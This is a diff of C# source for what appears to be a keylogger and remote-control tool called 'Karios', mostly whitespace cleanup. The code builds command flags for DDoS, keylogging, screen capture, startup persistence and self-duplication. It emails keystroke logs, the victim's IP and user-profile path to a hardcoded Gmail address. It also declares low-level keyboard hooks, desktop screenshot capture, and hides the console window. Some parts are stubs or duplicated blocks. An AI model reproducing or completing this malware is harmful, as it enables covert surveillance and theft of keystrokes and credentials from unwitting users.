@@ -117,54 +117,54 @@ namespace Karios
                         else
                             paramaters = paramaters + "&newclient=false";
                     }
-                    
-                        // 1 = DDOSOnline
-                        if (paramaters == "?")
-                            paramaters = paramaters + "ddosonline=true";
-                        else
-                            paramaters = paramaters + "&ddosonline=true";
 
-                        // 2 = DDOSIP
-                        if (paramaters == "?")
-                            paramaters = paramaters + "ddosip=true";
-                        else
-                            paramaters = paramaters + "&ddosip=true";
+                    // 1 = DDOSOnline
+                    if (paramaters == "?")
+                        paramaters = paramaters + "ddosonline=true";
+                    else
+                        paramaters = paramaters + "&ddosonline=true";
 
-                        // 3 = KeyloggerOnline
-                        if (paramaters == "?")
-                            paramaters = paramaters + "keyonline=true";
-                        else
-                            paramaters = paramaters + "&keyonline=true";
+                    // 2 = DDOSIP
+                    if (paramaters == "?")
+                        paramaters = paramaters + "ddosip=true";
+                    else
+                        paramaters = paramaters + "&ddosip=true";
 
-                        // 3 = KeyloggerOnline
-                        if (paramaters == "?")
-                            paramaters = paramaters + "keyonline=true";
-                        else
-                            paramaters = paramaters + "&keyonline=true";
+                    // 3 = KeyloggerOnline
+                    if (paramaters == "?")
+                        paramaters = paramaters + "keyonline=true";
+                    else
+                        paramaters = paramaters + "&keyonline=true";
 
-                        // 4 = KeyloggerEmail
-                        if (paramaters == "?")
-                            paramaters = paramaters + "keyloggeremail=true";
-                        else
-                            paramaters = paramaters + "&keyloggeremail=true";
+                    // 3 = KeyloggerOnline
+                    if (paramaters == "?")
+                        paramaters = paramaters + "keyonline=true";
+                    else
+                        paramaters = paramaters + "&keyonline=true";
 
-                        // 5 = CaptureSceen
-                        if (paramaters == "?")
-                            paramaters = paramaters + "capturescreen=true";
-                        else
-                            paramaters = paramaters + "&capturescreen=true";
+                    // 4 = KeyloggerEmail
+                    if (paramaters == "?")
+                        paramaters = paramaters + "keyloggeremail=true";
+                    else
+                        paramaters = paramaters + "&keyloggeremail=true";
 
-                        // 6 = Startup
-                        if (paramaters == "?")
-                            paramaters = paramaters + "startup=true";
-                        else
-                            paramaters = paramaters + "&startup=true";
+                    // 5 = CaptureSceen
+                    if (paramaters == "?")
+                        paramaters = paramaters + "capturescreen=true";
+                    else
+                        paramaters = paramaters + "&capturescreen=true";
 
-                        // 7 = Duplication
-                        if (paramaters == "?")
-                            paramaters = paramaters + "duplication=true";
-                        else
-                            paramaters = paramaters + "&duplication=true";
+                    // 6 = Startup
+                    if (paramaters == "?")
+                        paramaters = paramaters + "startup=true";
+                    else
+                        paramaters = paramaters + "&startup=true";
+
+                    // 7 = Duplication
+                    if (paramaters == "?")
+                        paramaters = paramaters + "duplication=true";
+                    else
+                        paramaters = paramaters + "&duplication=true";
 
                     // 8 = Website
                     if (paramaters == "?")
@@ -174,10 +174,10 @@ namespace Karios
 
                     // 9 = Reverse
                     if (paramaters == "?")
-                            paramaters = paramaters + "reverse=false";
-                        else
-                            paramaters = paramaters + "&reverse=false";
-                        
+                        paramaters = paramaters + "reverse=false";
+                    else
+                        paramaters = paramaters + "&reverse=false";
+
 
                     var commands = "";
                     try
@@ -220,10 +220,7 @@ namespace Karios
             }
             catch
             {
-
                 // ignored
-
-
             }
         }
 
@@ -272,8 +269,6 @@ namespace Karios
                 mail.To.Add(_emailEndpoint);
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
-                Attachment attachment;
-                attachment = new Attachment(pathToLog);
 
                 mail.To.Add("GINGIRULES@gmail.com");
                 mail.Subject = "log from keylogger on" +
@@ -365,7 +360,7 @@ namespace Karios
                     return localIp;
                 }
                 finally
-                {  
+                {
                 }
             }
         }
@@ -384,58 +379,54 @@ namespace Karios
                     // ignored
                 }
 
-                }
-                catch
-                {
-                }
-
             }
+
         }
 
-        public static void Ddos()
+    public static void Ddos()
+    {
+        using (var wc = new WebClient())
         {
-            using (var wc = new WebClient())
+            try
             {
-                try
-                {
-                }
-                catch
-                {
+            }
+            catch
+            {
 
-                }
             }
         }
-
-        private static Image CaptureDesktop()
-        {
-            var rectangle = Screen.PrimaryScreen.Bounds;
-            var bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
-            var graphics = Graphics.FromImage(bitmap);
-            graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
-            return bitmap;
-        }
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook,
-            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-            IntPtr wParam, IntPtr lParam);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
-
-        [DllImport("user32.dll")]
-        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        private const int SwHide = 0;
     }
+
+    private static Image CaptureDesktop()
+    {
+        var rectangle = Screen.PrimaryScreen.Bounds;
+        var bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
+        var graphics = Graphics.FromImage(bitmap);
+        graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
+        return bitmap;
+    }
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook,
+        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+        IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    private const int SwHide = 0;
+}
 }
